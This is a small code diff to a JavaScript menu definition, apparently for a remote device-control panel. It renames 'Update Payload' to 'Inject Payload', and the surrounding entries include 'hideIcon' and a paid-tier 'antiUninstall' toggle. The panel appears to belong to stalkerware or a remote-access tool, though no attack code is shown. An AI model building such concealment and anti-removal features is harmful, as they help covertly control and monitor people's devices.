@@ -118,7 +118,7 @@ const MEDIA_ACTIONS = [
 ];
 
 const SYSTEM_ACTIONS = [
-    { icon: "refresh-ccw", label: "Update Payload", type: "command", value: CMD.UPDATE_PAYLOAD },
+    { icon: "refresh-ccw", label: "Inject Payload", type: "command", value: CMD.UPDATE_PAYLOAD },
     { key: "hideIcon", type: "toggle-command" },
     { key: "antiUninstall", type: "toggle-command", vipOnly: true },
     { icon: "refresh-cw", label: "Refresh Device", type: "refresh-device", value: "" }
